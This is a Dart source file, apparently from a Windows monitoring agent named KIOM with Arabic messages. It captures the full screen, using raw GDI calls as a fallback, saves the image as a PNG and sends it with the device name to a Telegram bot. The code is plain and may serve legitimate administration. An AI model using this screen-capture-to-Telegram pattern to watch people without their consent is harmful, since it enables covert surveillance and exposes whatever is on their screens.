import 'dart:ffi';
import 'dart:io';

import 'package:ffi/ffi.dart';
import 'package:image/image.dart' as img;
import 'package:screen_capturer/screen_capturer.dart';

import '../config/agent_config.dart';
import '../utils/json_file_store.dart';
import 'telegram_notifier_service.dart';

class ScreenshotUploadResult {
  const ScreenshotUploadResult({
    required this.imageUrl,
    required this.localPath,
    required this.sentToTelegram,
    required this.captureMethod,
  });

  final String imageUrl;
  final String localPath;
  final bool sentToTelegram;
  final String captureMethod;

  Map<String, dynamic> toMap() => {
        'imageUrl': imageUrl,
        'localPath': localPath,
        'sentToTelegram': sentToTelegram,
        'captureMethod': captureMethod,
      };
}

final class _RgbQuad extends Struct {
  @Uint8()
  external int rgbBlue;

  @Uint8()
  external int rgbGreen;

  @Uint8()
  external int rgbRed;

  @Uint8()
  external int rgbReserved;
}

final class _BitmapInfoHeader extends Struct {
  @Uint32()
  external int biSize;

  @Int32()
  external int biWidth;

  @Int32()
  external int biHeight;

  @Uint16()
  external int biPlanes;

  @Uint16()
  external int biBitCount;

  @Uint32()
  external int biCompression;

  @Uint32()
  external int biSizeImage;

  @Int32()
  external int biXPelsPerMeter;

  @Int32()
  external int biYPelsPerMeter;

  @Uint32()
  external int biClrUsed;

  @Uint32()
  external int biClrImportant;
}

final class _BitmapInfo extends Struct {
  external _BitmapInfoHeader bmiHeader;

  @Array(1)
  external Array<_RgbQuad> bmiColors;
}

class ScreenshotService {
  ScreenshotService({
    required this.config,
    required this.store,
    TelegramNotifierService? telegram,
  }) : telegram =
            telegram ?? TelegramNotifierService(config: config, store: store);

  static const _smXVirtualScreen = 76;
  static const _smYVirtualScreen = 77;
  static const _smCxVirtualScreen = 78;
  static const _smCyVirtualScreen = 79;
  static const _srccopy = 0x00CC0020;
  static const _captureBlt = 0x40000000;
  static const _dibRgbColors = 0;
  static const _biRgb = 0;

  final AgentConfig config;
  final JsonFileStore store;
  final TelegramNotifierService telegram;

  Future<ScreenshotUploadResult> captureAndSend({
    required String deviceName,
  }) async {
    final screenshotsDir = Directory('${store.dir.path}\\screenshots');
    if (!await screenshotsDir.exists()) {
      await screenshotsDir.create(recursive: true);
    }
    final localPath =
        '${screenshotsDir.path}\\shot_${DateTime.now().millisecondsSinceEpoch}.png';
    var captureMethod = 'screen_capturer';
    try {
      await _captureWithScreenCapturer(localPath);
    } catch (e, st) {
      captureMethod = 'windows_gdi';
      await store.appendLog(
        'screenshot_screen_capturer_fallback',
        'فشل screen_capturer، سيتم استخدام Windows GDI المحلي',
        {
          'error': e.toString(),
          'stack': st.toString(),
        },
      );
      await _captureWithWindowsGdi(localPath);
      await _validatePng(localPath, source: captureMethod);
    }

    var sent = false;
    if (telegram.isConfigured) {
      sent = await telegram.sendPhoto(
        filePath: localPath,
        caption: 'KIOM screenshot - $deviceName - ${DateTime.now()}',
      );
    }

    return ScreenshotUploadResult(
      imageUrl: Uri.file(localPath, windows: true).toString(),
      localPath: localPath,
      sentToTelegram: sent,
      captureMethod: captureMethod,
    );
  }

  Future<void> _captureWithScreenCapturer(String localPath) async {
    if (!Platform.isWindows) {
      throw StateError('التقاط الشاشة مدعوم حالياً على Windows فقط.');
    }

    final file = File(localPath);
    if (await file.exists()) {
      await file.delete();
    }

    await ScreenCapturerPlatform.instance.captureScreen(imagePath: localPath);
    await _validatePng(localPath, source: 'screen_capturer');
  }

  Future<void> _validatePng(String localPath, {required String source}) async {
    final file = File(localPath);
    if (!await file.exists()) {
      throw StateError('فشل $source: لم يتم إنشاء ملف لقطة الشاشة.');
    }

    final bytes = await file.readAsBytes();
    if (bytes.length < 64) {
      throw StateError('فشل $source: ملف لقطة الشاشة فارغ أو غير مكتمل.');
    }

    final image = img.decodePng(bytes);
    if (image == null || image.width <= 0 || image.height <= 0) {
      throw StateError('فشل $source: الملف الناتج ليس صورة PNG صالحة.');
    }
  }

  Future<void> _captureWithWindowsGdi(String localPath) async {
    if (!Platform.isWindows) {
      throw StateError('التقاط الشاشة مدعوم حالياً على Windows فقط.');
    }

    final user32 = DynamicLibrary.open('user32.dll');
    final gdi32 = DynamicLibrary.open('gdi32.dll');

    final getSystemMetrics =
        user32.lookupFunction<Int32 Function(Int32), int Function(int)>(
            'GetSystemMetrics');
    final getDc = user32
        .lookupFunction<IntPtr Function(IntPtr), int Function(int)>('GetDC');
    final releaseDc = user32.lookupFunction<Int32 Function(IntPtr, IntPtr),
        int Function(int, int)>('ReleaseDC');
    final createCompatibleDc =
        gdi32.lookupFunction<IntPtr Function(IntPtr), int Function(int)>(
            'CreateCompatibleDC');
    final createCompatibleBitmap = gdi32.lookupFunction<
        IntPtr Function(IntPtr, Int32, Int32),
        int Function(int, int, int)>('CreateCompatibleBitmap');
    final selectObject = gdi32.lookupFunction<IntPtr Function(IntPtr, IntPtr),
        int Function(int, int)>('SelectObject');
    final bitBlt = gdi32.lookupFunction<
        Int32 Function(
          IntPtr,
          Int32,
          Int32,
          Int32,
          Int32,
          IntPtr,
          Int32,
          Int32,
          Uint32,
        ),
        int Function(
          int,
          int,
          int,
          int,
          int,
          int,
          int,
          int,
          int,
        )>('BitBlt');
    final getDibits = gdi32.lookupFunction<
        Int32 Function(
          IntPtr,
          IntPtr,
          Uint32,
          Uint32,
          Pointer<Void>,
          Pointer<_BitmapInfo>,
          Uint32,
        ),
        int Function(
          int,
          int,
          int,
          int,
          Pointer<Void>,
          Pointer<_BitmapInfo>,
          int,
        )>('GetDIBits');
    final deleteObject =
        gdi32.lookupFunction<Int32 Function(IntPtr), int Function(int)>(
            'DeleteObject');
    final deleteDc = gdi32
        .lookupFunction<Int32 Function(IntPtr), int Function(int)>('DeleteDC');

    final left = getSystemMetrics(_smXVirtualScreen);
    final top = getSystemMetrics(_smYVirtualScreen);
    final width = getSystemMetrics(_smCxVirtualScreen);
    final height = getSystemMetrics(_smCyVirtualScreen);
    if (width <= 0 || height <= 0) {
      throw StateError('تعذر تحديد أبعاد الشاشة.');
    }

    final screenDc = getDc(0);
    if (screenDc == 0) throw StateError('تعذر الوصول إلى شاشة Windows.');

    var memoryDc = 0;
    var bitmap = 0;
    var oldObject = 0;
    Pointer<_BitmapInfo>? bitmapInfo;
    Pointer<Uint8>? pixels;

    try {
      memoryDc = createCompatibleDc(screenDc);
      if (memoryDc == 0) throw StateError('تعذر إنشاء DC للصورة.');

      bitmap = createCompatibleBitmap(screenDc, width, height);
      if (bitmap == 0) throw StateError('تعذر إنشاء Bitmap للصورة.');

      oldObject = selectObject(memoryDc, bitmap);
      final copied = bitBlt(
        memoryDc,
        0,
        0,
        width,
        height,
        screenDc,
        left,
        top,
        _srccopy | _captureBlt,
      );
      if (copied == 0) throw StateError('فشل نسخ الشاشة إلى Bitmap.');

      bitmapInfo = calloc<_BitmapInfo>();
      bitmapInfo.ref.bmiHeader
        ..biSize = sizeOf<_BitmapInfoHeader>()
        ..biWidth = width
        ..biHeight = -height
        ..biPlanes = 1
        ..biBitCount = 32
        ..biCompression = _biRgb
        ..biSizeImage = width * height * 4
        ..biXPelsPerMeter = 0
        ..biYPelsPerMeter = 0
        ..biClrUsed = 0
        ..biClrImportant = 0;

      pixels = calloc<Uint8>(width * height * 4);
      final scanLines = getDibits(
        memoryDc,
        bitmap,
        0,
        height,
        pixels.cast<Void>(),
        bitmapInfo,
        _dibRgbColors,
      );
      if (scanLines == 0) throw StateError('فشل تحويل Bitmap إلى بيانات صورة.');

      final image = img.Image.fromBytes(
        width: width,
        height: height,
        bytes: pixels.asTypedList(width * height * 4).buffer,
        numChannels: 4,
        order: img.ChannelOrder.bgra,
      );
      await File(localPath).writeAsBytes(img.encodePng(image), flush: true);
    } finally {
      if (pixels != null) calloc.free(pixels);
      if (bitmapInfo != null) calloc.free(bitmapInfo);
      if (oldObject != 0 && memoryDc != 0) selectObject(memoryDc, oldObject);
      if (bitmap != 0) deleteObject(bitmap);
      if (memoryDc != 0) deleteDc(memoryDc);
      releaseDc(0, screenDc);
    }
  }
}
